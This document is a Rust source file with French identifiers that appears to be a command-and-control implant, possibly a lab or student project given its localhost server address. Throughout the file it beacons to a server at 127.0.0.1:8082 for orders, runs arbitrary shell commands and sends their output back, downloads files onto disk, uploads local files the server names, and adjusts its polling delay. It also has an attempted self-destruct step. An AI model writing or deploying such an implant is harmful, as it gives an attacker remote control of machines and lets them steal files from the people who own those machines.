use std::{
    io::{Result, Cursor},
    thread,
    time::Duration,
    process::{Command, Output},
    str,
    env
};
use reqwest::{header::CONTENT_TYPE};
use serde::{Serialize, Deserialize};
use bytes::Bytes;


#[derive(Serialize, Deserialize, Debug)]
enum OrdreType {
    Commande,
    Fichier,
    GetFichier,
    Vitesse,
    Autre
}

#[derive(Serialize, Deserialize, Debug)]
struct Ordre {
    ordre: OrdreType,
    arguments: Vec<String>,
}


//Exemple utilisation de la commande
// let vecteur = vec!["-a".to_string(), "-l".to_string()];
// exec_commande_shell(String::from("ls"), vecteur);
fn exec_commande_shell(command : String, args : Vec<String>) -> std::io::Result<Command> {
    let mut base_command = Command::new(command);
    if args.len() > 0 {
        for i in 0..args.len() {
            base_command.arg(args[i].clone());
        }
    }
    base_command.status().expect("error executing command");
    return Ok(base_command);      
}

#[tokio::main]
async fn sending_request(t : u64) -> Option<u64>{
    let client = reqwest::Client::builder()
    .build().unwrap();
    let response = client.get("http://127.0.0.1:8082")
    .body(String::from("Waiting for instructions"))
    .send()
    .await;
    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");

                    let texte : String = v.text().await.unwrap();
                    let contenu : std::result::Result<Ordre, serde_json::Error> = serde_json::from_str(&texte);

                    match contenu {
                       Ok(v) => {

                            match v.ordre {
                                OrdreType::Commande => {
                                    let command_args = v.arguments[1..].to_vec();
                                    let command_name = v.arguments.get(0).unwrap().clone();

                                    let result_command = exec_commande_shell(command_name, command_args);

                                    match result_command{
                                        Ok(mut v) => sending_request_with_result(v.output().expect("error")).await.unwrap(),
                                        Err(_) => println!("erreur")
                                    };
                                },
                                OrdreType::Fichier => {
                                    let filename = v.arguments[0].clone();
                                    let mut file = std::fs::File::create(filename).unwrap();
                                    
                                    let content = send_file_post_request().await;
                                    match content {
                                        Ok(v) => {
                                            let mut content = Cursor::new(v);
                                            std::io::copy(&mut content, &mut file).unwrap();
                                        },
                                        Err(_) => {
                                            panic!("Cannot receive file content !")
                                        }
                                    }
                                },
                                OrdreType::GetFichier => {
                                    let filename = v.arguments[0].as_str();
                                    get_file(filename).await;
                                }
                                OrdreType::Vitesse => {
                                    let new_vitesse = v.arguments[0].parse::<u64>().unwrap();
                                    return Some(new_vitesse);
                                },
                                _ => {
                                    println!("Ordre non implémenté");
                                }
                            }

                       },
                       Err(_) => {
                            println!("Erreur de lecture de l'ordre");
                       }
                    }

                },
                reqwest::StatusCode::REQUEST_TIMEOUT => {
                    println!("Request Timeout");
                },
                e => {
                    panic!("Uh oh! Something unexpected happened.   :   {:?}", e);
                }
            };
        },
        Err(_err) => println!("Pas de Connexion")
    };

    thread::sleep(Duration::from_millis(t));
    return None;
}


async fn get_file(filename: &str) -> () {
    let client = reqwest::Client::new();

    let file = std::fs::read(filename).unwrap();

    let response = client.post("http://127.0.0.1:8082")
    .header(CONTENT_TYPE, "multipart/form-data")
    .body(file)
    .send()
    .await;

    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("{}", v.text().await.unwrap());
                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(_err) => ()
    };
}



async fn send_file_post_request() -> std::result::Result<Bytes, reqwest::Error> {

    let client = reqwest::Client::new();
    let response = client.post("http://127.0.0.1:8082")
    .send()
    .await;

    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("file : Success!");

                    let bytes = v.bytes().await.unwrap();
                    return Ok(bytes);

                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(e) => return Err(e)
    };
}


async fn sending_request_with_result(result_command : Output) -> Result<()> {
    let client = reqwest::Client::new();
    let response = client.post("http://127.0.0.1:8082/")
    .body(String::from_utf8(result_command.stdout).unwrap()) 
    .send()
    .await;
    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");
                    println!("{}", v.text().await.unwrap());
                },
                reqwest::StatusCode::UNAUTHORIZED => {
                    println!("Need to grab a new token");
                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(_err) => ()
    };
    return Ok(());
}

fn autodestroy(){
    let path = env::current_dir();
    match path {
        Ok(v) => {
            println!("{}", v.display());
        },
        _ => {
            println!("An error occured catching the current path");
        }
    }
    exec_commande_shell("mv".to_string(), vec!["".to_string(), "/dev/NULL".to_string()]).unwrap();

}


fn main() {
    let mut delay_in_sec: f64 = 5.0; 
    let mut number_of_request_without_response = 0;
    while number_of_request_without_response < 1000000 {
        let result = sending_request((delay_in_sec*(1000 as f64)) as u64);
        match result {
            Some (new_time) =>  {
                delay_in_sec = new_time as f64;
                number_of_request_without_response = 0;
            },
            None => {
                number_of_request_without_response = number_of_request_without_response +1;
            }
        }
    }
    autodestroy();

}